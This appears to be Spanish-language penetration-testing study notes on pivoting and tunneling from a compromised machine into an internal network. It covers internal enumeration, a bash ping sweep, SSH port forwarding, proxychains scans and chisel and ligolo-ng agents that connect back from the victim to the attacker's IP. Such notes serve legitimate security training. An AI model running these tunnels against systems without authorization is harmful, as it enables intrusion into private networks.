# Pivoting y Tunneling

Cuando comprometes una máquina que tiene **una segunda interfaz de red**, se convierte en tu puente hacia una **red interna** que no alcanzas directamente. El **pivoting** es usar esa máquina para llegar a otras; el **tunneling** es encapsular tu tráfico a través de ella.

```pipeline
Tu máquina (atacante) -> Máquina comprometida (pivote) -> Red interna (10.10.x.x)
```

---

## Detectar que hay red interna

Ya con shell en la máquina comprometida, busca otras redes/hosts:

```bash
ip a                      # ¿una segunda interfaz? (eth1, 10.x, 192.168.x)
ip route                  # rutas hacia otras redes
arp -a                    # vecinos conocidos
cat /etc/hosts
ss -tulpn                 # servicios internos escuchando en 127.0.0.1
```

> **Consejo:** presta atención a servicios en `127.0.0.1` (solo accesibles desde la propia máquina) y a una segunda interfaz con otra subred. Ambos son la señal de que hay algo "detrás" que debes alcanzar con un túnel.

---

## Barrido de la red interna desde el pivote

Antes de montar túneles, averigua qué hay vivo (sin nmap, con bash):

```bash
for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i >/dev/null && echo "10.10.20.$i UP" &); done; wait
```

---

## SSH tunneling (si tienes credenciales SSH)

La forma más limpia. Tres modos:

### Local port forwarding (-L): traer UN servicio interno a tu máquina

```bash
ssh -L 8080:10.10.20.5:80 <user>@<pivote>
# ahora http://127.0.0.1:8080 = el puerto 80 de 10.10.20.5
```

### Remote port forwarding (-R): exponer un servicio TUYO en la víctima

```bash
ssh -R 4444:127.0.0.1:4444 <user>@<pivote>
```

### Dynamic / SOCKS proxy (-D): acceso a TODA la red interna

```bash
ssh -D 1080 <user>@<pivote>
```

Luego configura **proxychains** (`/etc/proxychains4.conf`):

```text
socks5 127.0.0.1 1080
```

Y lanza herramientas a través del proxy:

```bash
proxychains nmap -sT -Pn 10.10.20.5
proxychains curl http://10.10.20.5
proxychains evil-winrm -i 10.10.20.10 -u admin -p pass
```

> **Nota:** a través de proxychains usa escaneos **TCP connect** (`nmap -sT -Pn`), no SYN (`-sS`), porque el proxy SOCKS solo tunela conexiones TCP completas.

---

## Chisel (cuando NO hay SSH)

**Chisel** monta túneles sobre HTTP/WebSockets; perfecto cuando el pivote no tiene SSH o solo sale por HTTP. Sube el binario a la víctima.

### Reverse SOCKS (el caso más útil)

```bash
# En tu máquina (servidor)
./chisel server -p 8000 --reverse

# En la víctima (cliente) -> crea un SOCKS en tu 127.0.0.1:1080
./chisel client <TU_IP>:8000 R:socks
```

Después, como con SSH `-D`, usas **proxychains** apuntando a `127.0.0.1:1080`.

### Port forwarding puntual con chisel

```bash
# víctima: expón el 445 de un host interno en tu 127.0.0.1:4455
./chisel client <TU_IP>:8000 R:4455:10.10.20.10:445
```

---

## Ligolo-ng (moderno, muy cómodo)

**Ligolo-ng** crea una interfaz de red virtual (`tun`) y te deja acceder a la red interna como si estuvieras conectado a ella (sin proxychains):

```bash
# En tu máquina (proxy) tras crear la interfaz tun y la ruta a la red interna
./proxy -selfcert
# En la víctima (agente)
./agent -connect <TU_IP>:11601 -ignore-cert
```

Añades la ruta de la subred interna a la interfaz `ligolo` y ya accedes directo: `nmap 10.10.20.0/24`, etc.

---

## Otras técnicas

| Técnica | Cuándo |
| ------- | ------ |
| `socat` port forward | Reenvío puntual simple sin instalar nada raro. |
| Metasploit `autoroute` + `socks_proxy` | Si ya trabajas con Meterpreter. |
| `plink.exe` | SSH tunneling desde Windows. |

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `ssh` (-L/-R/-D) | Túneles si hay credenciales SSH. |
| `proxychains` | Encaminar cualquier herramienta por un SOCKS. |
| `chisel` | Túneles sobre HTTP/WS sin SSH. |
| `ligolo-ng` | Pivoting moderno con interfaz `tun` (sin proxychains). |
| `socat` | Reenvíos puntuales. |

---

> **Consejo:** el flujo de pivoting es: **(1)** detectar segunda red (`ip a`, `ip route`); **(2)** montar un SOCKS (SSH `-D`, chisel `R:socks` o ligolo); **(3)** lanzar tus herramientas con `proxychains` (o directo con ligolo). Recuerda: por SOCKS, escaneos **TCP connect** y objetivos concretos; nada de `-sS` ni barridos enormes, que van lentísimos por el túnel.
